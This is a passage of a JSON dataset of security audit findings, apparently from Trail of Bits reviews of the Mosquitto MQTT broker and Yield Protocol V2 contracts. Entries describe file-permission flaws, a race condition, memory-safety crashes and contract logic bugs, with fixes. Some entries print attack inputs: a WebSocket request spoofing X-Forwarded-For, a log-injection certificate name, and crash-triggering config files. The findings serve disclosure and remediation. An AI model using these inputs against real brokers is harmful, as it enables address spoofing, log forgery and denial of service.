        "body": "The dynsec init subcommand of the mosquitto_ctrl function is used to initialize a new conguration le for the Dynamic Security plugin. When creating the le , mosquitto_ctrl dynsec init does not set a le mode creation mask (via the umask(2) system call ) to set secure le permissions (e.g., only readable and writable by the current user). As a result, mosquitto_ctrl creates world-readable Dynamic Security conguration les on default congurations of most Linux distributions, which use a mask value of 022 . $ ./mosquitto_ctrl dynsec init dynamic-security.json admin New password for admin: Reenter password for admin: The client 'admin' has been created in the file 'dynamic-security.json'. This client is configured to allow you to administer the dynamic security plugin only. It does not have access to publish messages to normal topics. You should create your application clients to do that, for example: mosquitto_ctrl <connect options> dynsec createClient <username> mosquitto_ctrl <connect options> dynsec createRole <rolename> mosquitto_ctrl <connect options> dynsec addRoleACL <rolename> publishClientSend my/topic [priority] mosquitto_ctrl <connect options> dynsec addClientRole <username> <rolename> [priority] See https://mosquitto.org/documentation/dynamic-security/ for details of all commands. $ ls -latr dynamic-security.json -rw-rw-r-- 1 ubuntu ubuntu 1317 Feb 28 20:39 dynamic-security.json Figure 6.1: The mosquitto_ctrl functions dynsec init command creates a world-readable Dynamic Security conguration le on Ubuntu 22.04. Exploit Scenario A Mosquitto broker administrator uses the mosquitto_ctrl utility to generate a conguration le for the Dynamic Security plugin. An attacker on the system, under another user account, does not have administrative access to the Dynamic Security plugin but can read the directory in which the conguration le was created. The attacker exploits the default world-readable permissions of the conguration le to access its contents, brute-force the administrator password hash (see TOB-MOSQ-CR-1 ), and gain access to the Dynamic Security plugin. Recommendations Short term, have the mosquitto_ctrl utility call umask with a mask of 077 before calling fopen to create the conguration le. This will ensure that only the user running mosquitto_ctrl can read or write to the le. Long term, use the File created without restricting permissions CodeQL query to identify additional instances of this issue.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "7. Race condition in le existence check by mosquitto_ctrl dynsec init ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-eclipse-mosquitto-securityreview.pdf",
        "body": "The dynsec init subcommand of the mosquitto_ctrl utility is used to initialize a new conguration le for the Dynamic Security plugin. dynsec init rst checks whether a le with the specied name already exists using a call to fopen (line 710 of gure 7.1). If the le exists, mosquitto_ctrl refuses to write to the le and prints an error. If the le does not exist, dynsec init calls fopen again to write the conguration data to the le (line 725 of gure 7.1). These two calls to fopen do not happen atomically, resulting in a time-of-check to time-of-use (TOCTOU) race condition in which an attacker-controlled le could be created in the interval. 710 711 712 713 fptr = fopen(filename, \"rb\" ); if (fptr){ fclose(fptr); fprintf(stderr, \"dynsec init: '%s' already exists. Remove the file or use a different location..\\n\" , filename); return -1 ; if (tree == NULL ){ fprintf(stderr, \"dynsec init: Out of memory.\\n\" ); return MOSQ_ERR_NOMEM; 714 715 } 716 717 tree = init_create(admin_user, admin_password, \"admin\" ); 718 719 720 721 } 722 json_str = cJSON_Print(tree); 723 cJSON_Delete(tree); 724 725 726 727 728 729 730 } else { fprintf(fptr, \"%s\" , json_str); free(json_str); fclose(fptr); fptr = fopen(filename, \"wb\" ); if (fptr){ Figure 7.1: apps/mosquitto_ctrl/dynsec.c#L710-L730 The default use of the fs.protected_symlinks=1 and fs.protected_regular=1 kernel parameters on some Linux distributions mitigates exploitation of this issue, but Mosquitto developers should not assume these are set on all systems where mosquitto_ctrl might be used. Exploit Scenario A Mosquitto broker administrator uses the mosquitto_ctrl utility to create a new Dynamic Security conguration le (e.g., dynamic-security.json ). An attacker on the system, under another user account, does not have administrative access to the Dynamic Security plugin but can write to the directory where dynamic-security.json is created. The attacker writes a program to exploit the race condition in mosquitto_ctrl dynsec init . The program repeatedly tries to create dynamic-security.json as a symlink to another le that is readable by the attacker and writable by the administrator. Once the symlink is successfully created in the interval between the two calls to fopen (gure 7.1), mosquitto_ctrl writes the Dynamic Security conguration data, including the password hash for the administrator user, to the attacker-controlled destination le. The attacker then brute-forces the hash (see TOB-MOSQ-CR-1 ) to gain administrative access to the Dynamic Security plugin. Recommendations Short term, replace the two calls to fopen with a single call to open(3) , passing the O_CREAT and O_EXCL ags (gure 7.2). The man page for open(3) describes the behavior of these ags: If O_CREAT and O_EXCL are set, open() shall fail if the le exists. The check for the existence of the le and the creation of the le if it does not exist shall be atomic with respect to other threads executing open() naming the same lename in the same directory with O_EXCL and O_CREAT set. #include <fcntl.h> #include <errno.h> fd = open(pathname, O_CREAT | O_WRONLY | O_EXCL, S_IRUSR | S_IWUSR); if (fd < 0 ) { // Failure to create file if (errno == EEXIST) { // The file already exists } } else { // Use the file } Figure 7.2: Using open(3) with O_CREAT and O_EXCL ags to check whether a le exists and to create it atomically",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "8. Use-after-free instances in dynsec_groups__nd and dynsec_clients__nd ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-eclipse-mosquitto-securityreview.pdf",
        "body": "Fuzzing Dynamic Security conguration le parsing revealed two use-after-free instances that occur when the plugin unloads, resulting in undened behavior. The AddressSanitizer crash reports are provided in appendix D . The use-after-free instances are triggered by a conguration le that contains groups or clients with duplicate names (gures 8.1 and 8.2, respectively). { \"groups\" : [ { \"groupname\" : \"group0\" }, { \"groupname\" : \"group0\" } ] } Figure 8.1: A Dynamic Security conguration le with duplicate group names causes a use-after-free instance in the dynsec_groups__find function. { \"clients\" : [ { \"username\" : \"user0\" }, { \"username\" : \"user0\" } ] } Figure 8.2: A Dynamic Security conguration le with duplicate client usernames causes a use-after-free instance in the dynsec_clients__find function. When unloading the conguration corresponding to one of the above les, the Dynamic Security plugin attempts to free the memory it allocated for groups and clients. However, in doing so, dynsec_groups__find (gure 8.3) and dynsec_clients__find dereference a pointer to a dynsec__group or dynsec__client structure that has already been freed by group__free_item (gure 8.4) or client__free_item . 78 struct dynsec__group *dynsec_groups__find( struct dynsec__data *data, const char *groupname) 79 { 80 81 82 83 group); 84 85 86 } struct dynsec__group *group = NULL ; if (groupname){ HASH_FIND(hh, data->groups, groupname, strlen(groupname), } return group; Figure 8.3: plugins/dynamic-security/groups.c#7886 88 *group) static void group__free_item ( struct dynsec__data *data, struct dynsec__group 89 { 90 91 92 93 94 95 96 97 98 99 100 101 102 103 } struct dynsec__group *found_group = NULL ; if (group == NULL ) return ; found_group = dynsec_groups__find(data, group->groupname); if (found_group){ HASH_DEL(data->groups, found_group); } dynsec__remove_all_clients_from_group(group); mosquitto_free(group->text_name); mosquitto_free(group->text_description); dynsec_rolelist__cleanup(&group->rolelist); mosquitto_free(group); Figure 8.4: plugins/dynamic-security/groups.c#88103 Exploit Scenario A Mosquitto broker administrator manually edits a Dynamic Security conguration le and inadvertently adds a group or client with a duplicate name. When the broker exits, the plugin is unloaded, and undened behavior occurs (which an attacker can exploit to execute arbitrary code in certain conditions). Recommendations Short term, do not dereference dynsec__group or dynsec__client structure pointers that have already been freed.",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: High"
        ]
    },
    {
        "title": "9. NULL pointer dereference in dynsec_roles__cong_load ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-eclipse-mosquitto-securityreview.pdf",
        "body": "Fuzzing Dynamic Security conguration le parsing revealed a NULL pointer dereference that causes the broker to crash when the plugin loads. An AddressSanitizer crash report is provided in appendix E . When parsing the roles array of a Dynamic Security JSON conguration le, the Dynamic Security plugin does not ensure that the values of the textname and textdescription elds are strings before passing their cJSON valuestring eld to the mosquitto_strdup function (gure 9.1). If either value is another type, such as a number, valuestring will be NULL , causing a NULL pointer dereference and a crash when accessed by mosquitto_strdup , which does not perform a NULL check of its argument. } /* Text name */ if (jtmp != NULL ){ role->text_name = mosquitto_strdup(jtmp->valuestring) ; if (role->text_name == NULL ){ mosquitto_free(role); continue ; 280 281 jtmp = cJSON_GetObjectItem(j_role, \"textname\" ); 282 283 284 285 286 287 288 } 289 290 291 jtmp = cJSON_GetObjectItem(j_role, \"textdescription\" ); 292 293 294 295 296 297 298 299 } mosquitto_free(role->text_name); mosquitto_free(role); continue ; /* Text description */ if (jtmp != NULL ){ } role->text_description = mosquitto_strdup(jtmp->valuestring) ; if (role->text_description == NULL ){ Figure 9.1: The jtmp->valuestring eld may be NULL when given to mosquitto_strdup. ( plugins/dynamic-security/roles.c#280299 ) { \"roles\" : [{ \"rolename\" : \"admin\" , \"textname\" : 2 }] } Figure 9.2: The Dynamic Security conguration le triggers a NULL pointer dereference when the cJSON valuestring of the textname eld is accessed. { } \"roles\" : [{ \"rolename\" : \"admin\" , \"textdescription\" : 2 }] Figure 9.3: The Dynamic Security conguration le triggers a NULL pointer dereference when the cJSON valuestring of the textdescription eld is accessed. Exploit Scenario A Mosquitto broker administrator inadvertently species a non-string value for the textname or textdescription elds of a role in a Dynamic Security conguration le. A segmentation fault occurs when the plugin attempts to parse the le, giving the administrator no information as to how to resolve the issue and denying service to all clients and bridges that depend on the broker. Recommendations Short term, use the cJSON_IsString function to ensure that the values of textname and textdescription are strings before accessing valuestring . Consider adding a NULL check in mosquitto_strdup .",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "10. Broker creates world-readable TLS key log les ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-eclipse-mosquitto-securityreview.pdf",
        "body": "The Mosquitto brokers --tls-keylog command-line argument allows broker operators to log TLS key material to a le for debugging purposes. When creating the key log le with fopen , the tls_keylog_callback function does not set a le mode creation mask (via the umask(2) system call ) to set secure le permissions (e.g., only readable and writable by the current user). static void tls_keylog_callback ( const SSL *ssl, const char *line) 329 330 { 331 332 333 334 335 336 337 338 339 340 341 342 } FILE *fptr; UNUSED(ssl); if (db.tls_keylog){ fptr = fopen(db.tls_keylog, \"at\" ); if (fptr){ fprintf(fptr, \"%s\\n\" , line); fclose(fptr); } } Figure 10.1: The tls_keylog_callback function does not set a secure le mode creation mask. ( src/net.c#329342 ) As a result, the broker logs TLS key material to a world-readable le on default congurations of most Linux distributions, which use a mask value of 022 . $ ./src/mosquitto -c ./mosquitto.tls.conf --tls-keylog keylog 1678804656: mosquitto version 2.1.0 starting 1678804656: Config loaded from ./mosquitto.tls.conf. 1678804656: Bridge support available. 1678804656: Persistence support available. 1678804656: TLS support available. 1678804656: TLS-PSK support available. 1678804656: Websockets support available. 1678804656: Opening ipv4 listen socket on port 8883. 1678804656: Opening ipv6 listen socket on port 8883. 1678804656: TLS key logging to 'keylog' enabled for all listeners. 1678804656: TLS key logging is for DEBUGGING only. 1678804656: mosquitto version 2.1.0 running ... ^C1678804559: mosquitto version 2.1.0 terminating $ ls -la keylog -rw-rw-r-- 1 ubuntu ubuntu 938 Mar 14 14:35 keylog Figure 10.2: Mosquittos --tls-keylog feature creates a world-readable key log le on Ubuntu 22.04. Exploit Scenario To troubleshoot connection issues, a Mosquitto broker administrator uses the --tls-keylog argument to log TLS key material to a le. A suciently privileged attacker on the system captures trac on the network interface(s) used by the broker but, due to the brokers use of TLS, is unable to read the plaintext MQTT content. However, the attacker can read the directory in which the TLS key log le was created. The attacker exploits the default world-readable permissions of this le to access the TLS key material and decrypt the recorded trac. Recommendations Short term, have the tls_keylog_callback function call umask with a mask of 077 before calling fopen to create the key log le. This will ensure that only the user running the broker can read or write to the le. Long term, use the File created without restricting permissions CodeQL query to identify additional instances of this issue.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "11. Broker trusts existing TLS key log les ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-eclipse-mosquitto-securityreview.pdf",
        "body": "The Mosquitto brokers --tls-keylog command-line argument allows broker operators to log TLS key material to a le for debugging purposes. Before writing to the key log le, the tls_keylog_callback function does not ensure that one of the following conditions is met: A) the le does not already exist, or B) if the le exists, it is a regular le with secure permissions (owned by the user running Mosquitto, with read/write bits set for only that user). Consequently, if an attacker can predict the name of the key log le before it is created and write to its parent directory, they can create the le in advance and access its contents when the broker begins logging TLS key material. static void tls_keylog_callback ( const SSL *ssl, const char *line) 329 330 { 331 332 333 334 335 336 337 338 339 340 341 342 } FILE *fptr; UNUSED(ssl); if (db.tls_keylog){ fptr = fopen(db.tls_keylog, \"at\" ); if (fptr){ fprintf(fptr, \"%s\\n\" , line); fclose(fptr); } } Figure 11.1: The tls_keylog_callback function does not check for le existence and permissions. ( src/net.c#329342 ) Exploit Scenario To troubleshoot connection issues, a Mosquitto broker administrator wants to use the --tls-keylog argument to log TLS key material to a le. A suciently privileged attacker on the system captures trac on the network interface(s) used by the broker but, due to the brokers use of TLS, is unable to read the plaintext MQTT content. However, the attacker knows what the name of the key log le will be and can write to the directory in which it will be created. The attacker creates this le, and when the broker is run with the --tls-keylog argument, it begins logging key material to the le without noticing that the attacker has read access to it. The attacker accesses the TLS key material and decrypts the recorded trac. Recommendations Short term, have the tls_keylog_callback function atomically check (see TOB-MOSQ-CR-7 ) whether the key log le already exists and create it if it does not. If it already exists, the function should ensure that it is a regular le (i.e., not a symlink or other special type of le), that it is owned by the user running Mosquitto, and that only the owner has read and write permissions for it. 12. libmosquitto accepts wildcard certicates for public su\u0000xes Severity: Medium Diculty: High Type: Data Validation Finding ID: TOB-MOSQ-CR-12 Target: lib/tls_mosq.c",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "13. Username characters not validated when taken from client certicate ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-eclipse-mosquitto-securityreview.pdf",
        "body": "An MQTT username that the Mosquitto broker receives in a CONNECT packet is validated using the mosquitto_validate_utf8 function, called from the packet__read_string function. mosquitto_validate_utf8 veries that the string it receives is valid UTF-8 and does not contain control characters, such as newlines and carriage returns. As an alternative to reading the username from the CONNECT packet, the use_identity_as_username and use_subject_as_username conguration options allow the broker to determine the username from the certicate presented by the client (either the Common Name [CN] or the Subject elds). When one of these options is set, the function responsible for assigning the username is get_username_from_cert , which does not call mosquitto_validate_utf8 to validate the username. As a result, the username specied in a client certicate may contain characters that would not otherwise be allowed. Exploit Scenario A broker is congured with the use_identity_as_username option. An attacker obtains a client certicate, signed by the brokers trusted certicate authority, with a CN eld that contains arbitrary text that they wish to inject into the brokers logs. The CN is prexed with a newline byte (0x0a)for example, \\n<any timestamp>: log injection . When the attacker uses this certicate to connect to the broker, the attackers chosen text is inserted on its own lines in the brokers logging destination, misleading the broker operator or obfuscating other malicious activity in the logs. 1678832163: New client connected from 127.0.0.1:57940 as <any timestamp>: log injection (p4, c1, k60, u' <any timestamp>: log injection'). 1678832163: No will message specified. 1678832163: Client <any timestamp>: log injection negotiated TLSv1.3 cipher TLS_AES_256_GCM_SHA384 1678832163: Sending CONNACK to <any timestamp>: log injection (0, 0) <any timestamp>: log injection Figure 13.1: The attacker can inject arbitrary lines into the brokers logs. Recommendations Short term, have the get_username_from_cert function call mosquitto_validate_utf8 on the contents of the certicates CN and Subject elds when use_identity_as_username or use_subject_as_username is set.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "14. Improper parsing of X-Forwarded-For header ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-eclipse-mosquitto-securityreview.pdf",
        "body": "For listeners that use the WebSocket protocol, Mosquitto reads and parses the X-Forwarded-For HTTP header, if supplied, to determine the originating IP address of a client (gure 14.1). Specically, Mosquitto treats the header value as a comma-separated list of addresses and returns the rst entry in the list as the client address. This entry is then assigned to the address eld of the clients mosquitto structure (gure 14.2). This handling of the X-Forwarded-For header is incorrect for two reasons: 1. The broker always reads this header, even if there are no proxies in front of it. When there are no proxies, the value of the header is controlled entirely by the client, so the client can trivially spoof its IP address by providing its own X-Forwarded-For header. There is currently no way to inform the broker that there are no proxies in use and that the header should be ignored. 2. Proxies typically append, rather than overwrite, the trustworthy address of the client to the untrustworthy value of X-Forwarded-For that the client supplies. As a result, the rst value in the list cannot be trusted, and using it allows the client to spoof its IP address. 206 } else if (!strncasecmp(http_headers[i].name, \"X-Forwarded-For\" , http_headers[i].name_len)){ 207 208 forwarded_for = http_headers[i].value; forwarded_for_len = first_entry(forwarded_for, ( int )http_headers[i].value_len) ; 209 210 211 212 213 214 215 216 mosquitto__FREE(mosq->address); mosq->address = mosquitto__malloc(( size_t )forwarded_for_len+ 1 ); if (!mosq->address){ return MOSQ_ERR_NOMEM; } strncpy(mosq->address, forwarded_for, ( size_t )forwarded_for_len); mosq->address[forwarded_for_len] = '\\0' ; Figure 14.1: The value of the X-Forwarded-For header is passed to the first_entry function. ( src/http_serv.c#206216 ) static int first_entry ( const char *s, int len) int i; for (i= 0 ; i<len; i++){ if (s[i] == '\\0' || s[i] == ',' ){ return i; } } return len; 64 65 { 66 67 68 69 70 71 72 73 74 } Figure 14.2: The first_entry function extracts the rst entry in the comma-separated X-Forwarded-For list. ( src/http_serv.c#6474 ) Exploit Scenario A Mosquitto broker is congured to use the WebSocket protocol but is not situated behind any proxies. An attacker connects to the broker and sends a WebSocket handshake with an X-Forwarded-For header containing an IP address they wish to spoof (e.g., 8.8.8.8 ). GET /mqtt HTTP/1.1 Host: localhost X-Forwarded-For: 8.8.8.8 Upgrade: websocket Connection: Upgrade Sec-WebSocket-Key: Ox0b8Xy0PXHwERd7XOkvnQ== Sec-WebSocket-Protocol: mqtt Sec-WebSocket-Version: 13 Figure 14.3: The WebSocket handshake with the X-Forwarded-For header can be used to spoof the clients IP address. The attacker then sends an MQTT CONNECT packet over the WebSocket stream. Once this happens, the broker begins reporting the address of the attacker as 8.8.8.8 (gure 14.4), and the attacker can bypass any IP addressbased restrictions imposed by the broker or its plugins. 1678839485: New connection from 127.0.0.1:44116 on port 8080. 1678839485: New client connected from 8.8.8.8 :44116 as foo (p4, c0, k60). Figure 14.4: The broker begins reporting the spoofed IP address. Recommendations Short term, disable parsing of the X-Forwarded-For header by default. Add a conguration option to enable it that also species the number of proxies between clients and the broker. Once the number of proxies is known, determine the correct client IP address in the X-Forwarded-For list by counting backwards from the end of the list by the congured number of proxies minus one. For example, with one proxy, the last address in the list is the clients. With two proxies, the second from the last is the clients, and so on. References  MDN Web Docs: X-Forwarded-For",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Low"
        ]
    },
    {
        "title": "15. Logger registers with DLT when DLT is not a log destination ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-eclipse-mosquitto-securityreview.pdf",
        "body": "When built with the WITH_DLT macro, Mosquitto supports the Diagnostic Log and Trace (DLT) service as a log destination. At startup, Mosquitto checks for the presence of a named pipe (FIFO) at /tmp/dlt (gure 15.1) and, if found, uses the DLT API to register itself, which involves writing to /tmp/dlt (gure 15.2). These actions occur even when DLT is not congured as a log destination or not present on the system. if (stat( \"/tmp/dlt\" , &statbuf) == 0 ){ if (S_ISFIFO(statbuf.st_mode)){ 84 memset(&statbuf, 0 , sizeof (statbuf)); 85 86 87 88 89 90 91 92 dlt_allowed = true ; close(fd); } } fd = open( \"/tmp/dlt\" , O_NONBLOCK | O_WRONLY); if (fd != -1 ){ Figure 15.1: Mosquitto checks for a named pipe at /tmp/dlt . ( src/logging.c#8492 ) 138 139 140 141 142 #ifdef WITH_DLT dlt_fifo_check(); if (dlt_allowed){ DLT_REGISTER_APP( \"MQTT\" , \"mosquitto log\" ); dlt_register_context(&dltContext, \"MQTT\" , \"mosquitto DLT context\" ); 143 } Figure 15.2: Mosquitto registers with DLT. ( src/logging.c#138143 ) Mosquitto does not verify that the user congured DLT for logging and instead conrms only that /tmp/dlt exists and is a named pipe, so unexpected behavior may occur if the le is controlled by an attacker. As only nonsensitive registration metadata is written to the le unless DLT is set as a log destination, the severity of this issue is set to informational. It is possible to view the registration metadata written to the named pipe by reading from it before the broker exits. $ tail -f /tmp/dlt | xxd 00000000: 4455 4801 0200 0000 4d51 5454 fc80 1b00 DUH.....MQTT.... 00000010: 0d00 0000 6d6f 7371 7569 7474 6f20 6c6f ....mosquitto lo 00000020: 6744 5548 0104 0000 004d 5154 544d 5154 gDUH.....MQTTMQT 00000030: 5400 0000 00fe fefc 801b 0015 0000 006d T..............m 00000040: 6f73 7175 6974 746f 2044 4c54 2063 6f6e osquitto DLT con 00000050: 7465 7874 4455 4801 0500 0000 4d51 5454 textDUH.....MQTT 00000060: 4d51 5454 fc80 1b00 4455 4801 0300 0000 MQTT....DUH..... Figure 15.3: Reading from /tmp/dlt Recommendations Short term, have the log__init function access /tmp/dlt and register Mosquitto with DLT only when the user congures it as a log destination. 16. Documentation recommends insecure encryption practices for TLS private key Severity: Informational Diculty: Low Type: Cryptography Finding ID: TOB-MOSQ-CR-16 Target: https://mosquitto.org/man/mosquitto-tls-7.html",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "1. Lack of contract existence check on delegatecall may lead to unexpected behavior ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/YieldV2.pdf",
        "body": "The Ladle contract uses the delegatecall proxy pattern. If the implementation contract is incorrectly set or is self-destructed, the contract may not detect failed executions. The Ladle contract implements the batch and moduleCall functions; users invoke the former to execute batched calls within a single transaction and the latter to make a call to an external module. Neither function performs a contract existence check prior to executing a delegatecall. Figure 1.1 shows the moduleCall function. /// @dev Allow users to use functionality coded in a module, to be used with batch /// @notice Modules must not do any changes to the vault (owner, seriesId, ilkId), /// it would be disastrous in combination with batch vault caching function moduleCall(address module, bytes calldata data) external payable returns (bytes memory result) { } require (modules[module], \"Unregistered module\"); bool success; (success, result) = module.delegatecall(data); if (!success) revert(RevertMsgExtractor.getRevertMsg(result)); Figure 1.1: vault-v2/contracts/Ladle.sol#L186-L197 An external modules address must be registered by an administrator before the function calls that module. /// @dev Add or remove a module. function addModule(address module, bool set) external 15 Yield V2 auth modules[module] = set; emit ModuleAdded(module, set); { } Figure 1.2: vault-v2/contracts/Ladle.sol#L143-L150 If the administrator sets the module to an incorrect address or to the address of a contract that is subsequently destroyed, a delegatecall to it will still return success. This means that if one call in a batch does not execute any code, it will still appear to have been successful, rather than causing the entire batch to fail. The Solidity documentation includes the following warning: The low-level functions call, delegatecall and staticcall return true as their first return value if the account called is non-existent, as part of the design of the EVM. Account existence must be checked prior to calling if needed. Figure 1.3: A snippet of the Solidity documentation detailing unexpected behavior related to delegatecall Exploit Scenario Alice, a privileged member of the Yield team, accidentally sets a module to an incorrect address. Bob, a user, invokes the moduleCall method to execute a batch of calls. Despite Alices mistake, the delegatecall returns success without making any state changes or executing any code. Recommendations Short term, implement a contract existence check before a delegatecall. Document the fact that using suicide or selfdestruct can lead to unexpected behavior, and prevent future upgrades from introducing these functions. Long term, carefully review the Solidity documentation, especially the Warnings section, and the pitfalls of using the delegatecall proxy pattern. 16 Yield V2",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "2. Use of delegatecall in a payable function inside a loop ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/YieldV2.pdf",
        "body": "The Ladle contract uses the delegatecall proxy pattern (which takes user-provided call data) in a payable function within a loop. This means that each delegatecall within the for loop will retain the msg.value of the transaction: /// @dev Allows batched call to self (this contract). /// @param calls An array of inputs for each call. function batch(bytes[] calldata calls) external payable returns(bytes[] memory results) { results = new bytes[](calls.length); for (uint256 i; i < calls.length; i++) { (bool success, bytes memory result) = address(this).delegatecall(calls[i]); if (!success) revert(RevertMsgExtractor.getRevertMsg(result)); results[i] = result; } // build would have populated the cache, this deletes it cachedVaultId = bytes12(0); } Figure 2.1: vault-v2/contracts/Ladle.sol#L186-L197 The protocol does not currently use the msg.value in any meaningful way. However, if a future version or refactor of the core protocol introduced a more meaningful use of it, it could be exploited to tamper with the system arithmetic. Exploit Scenario Alice, a member of the Yield team, adds a new functionality to the core protocol that adjusts users balances according to the msg.value. Eve, an attacker, uses the batching functionality to increase her ETH balance without actually sending funds from her account, thereby stealing funds from the system. 17 Yield V2 Recommendations Short term, document the risks associated with the use of msg.value and ensure that all developers are aware of this potential attack vector. Long term, detail the security implications of all functions in both the documentation and the code to ensure that potential attack vectors do not become exploitable when code is refactored or added. References  Two Rights Might Make a Wrong, Paradigm 18 Yield V2",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "3. Lack of two-step process for critical operations ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/YieldV2.pdf",
        "body": "The _give function in the Cauldron contract transfers the ownership of a vault in a single step. There is no way to reverse a one-step transfer of ownership to an address without an owner (i.e., an address with a private key not held by any user). This would not be the case if ownership were transferred through a two-step process in which an owner proposed a transfer and the prospective recipient accepted it. /// @dev Transfer a vault to another user. function _give(bytes12 vaultId, address receiver) internal returns(DataTypes.Vault memory vault) { } require (vaultId != bytes12(0), \"Vault id is zero\"); vault = vaults[vaultId]; vault.owner = receiver; vaults[vaultId] = vault; emit VaultGiven(vaultId, receiver); Figure 3.1: vault-v2/contracts/Cauldron.sol#L227-L237 Exploit Scenario Alice, a Yield Protocol user, transfers ownership of her vault to her friend Bob. When entering Bobs address, Alice makes a typo. As a result, the vault is transferred to an address with no owner, and Alices funds are frozen. Recommendations Short term, use a two-step process for ownership transfers. Additionally, consider adding a zero-value check of the receivers address to ensure that vaults cannot be transferred to the zero address. Long term, use a two-step process for all irrevocable critical operations. 19 Yield V2",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "4. Risks associated with use of ABIEncoderV2 ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/YieldV2.pdf",
        "body": "The contracts use Soliditys ABIEncoderV2, which is enabled by default in Solidity version 0.8. This encoder has caused numerous issues in the past, and its use may still pose risks. More than 3% of all GitHub issues for the Solidity compiler are related to current or former experimental features, primarily ABIEncoderV2, which was long considered experimental. Several issues and bug reports are still open and unresolved. ABIEncoderV2 has been associated with more than 20 high-severity bugs, some of which are so recent that they have not yet been included in a Solidity release. For example, in March 2019 a severe bug introduced in Solidity 0.5.5 was found in the encoder. Exploit Scenario The Yield Protocol smart contracts are deployed. After the deployment, a bug is found in the encoder, which means that the contracts are broken and can all be exploited in the same way. Recommendations Short term, use neither ABIEncoderV2 nor any experimental Solidity feature. Refactor the code such that structs do not need to be passed to or returned from functions. Long term, integrate static analysis tools like Slither into the continuous integration pipeline to detect unsafe pragmas. 20 Yield V2",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: Low"
        ]
    },
    {
        "title": "5. Project dependencies contain vulnerabilities ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/YieldV2.pdf",
        "body": "Although dependency scans did not yield a direct threat to the project under review, yarn audit identied dependencies with known vulnerabilities. Due to the sensitivity of the deployment code and its environment, it is important to ensure dependencies are not malicious. Problems with dependencies in the JavaScript community could have a signicant eect on the repositories under review. The output below details these issues. NPM Advisory",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Low"
        ]
    },
    {
        "title": "6. Witchs buy and payAll functions allow users to buy collateral from vaults not undergoing auctions ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/YieldV2.pdf",
        "body": "The buy and payAll functions in the Witch contract enable users to buy collateral at an auction. However, neither function checks whether there is an active auction for the collateral of a vault. As a result, anyone can buy collateral from any vault. This issue also creates an arbitrage opportunity, as the collateral of an overcollateralized vault can be bought at a below-market price. An attacker could drain vaults of their funds and turn a prot through repeated arbitrage. Exploit Scenario Alice, a user of the Yield Protocol, opens an overcollateralized vault. Attacker Bob calls payAll on Alices vault. As a result, Alices vault is liquidated, and she loses the excess collateral (the portion that made the vault overcollateralized). Recommendations Short term, ensure that buy and payAll fail if they are called on a vault for which there is no active auction. Long term, ensure that all functions revert if the system is in a state in which they are not allowed to be called. 22 Yield V2",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Low"
        ]
    },
    {
        "title": "7. Solidity compiler optimizations can be problematic ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/YieldV2.pdf",
        "body": "The Yield Protocol V2 contracts have enabled optional compiler optimizations in Solidity. There have been several optimization bugs with security implications. Moreover, optimizations are actively being developed. Solidity compiler optimizations are disabled by default, and it is unclear how many contracts in the wild actually use them. Therefore, it is unclear how well they are being tested and exercised. High-severity security issues due to optimization bugs have occurred in the past. A high-severity bug in the emscripten-generated solc-js compiler used by True and Remix persisted until late 2018. The x for this bug was not reported in the Solidity CHANGELOG. Another high-severity optimization bug resulting in incorrect bit shift results was patched in Solidity 0.5.6. More recently, another bug due to the incorrect caching of keccak256 was reported. A compiler audit of Solidity from November 2018 concluded that the optional optimizations may not be safe. It is likely that there are latent bugs related to optimization and that new bugs will be introduced due to future optimizations. Exploit Scenario A latent or future bug in Solidity compiler optimizationsor in the Emscripten transpilation to solc-jscauses a security vulnerability in the Yield Protocol V2 contracts. Recommendations Short term, measure the gas savings from optimizations and carefully weigh them against the possibility of an optimization-related bug. Long term, monitor the development and adoption of Solidity compiler optimizations to assess their maturity. 23 Yield V2",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "8. Risks associated with EIP-2612 ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/YieldV2.pdf",
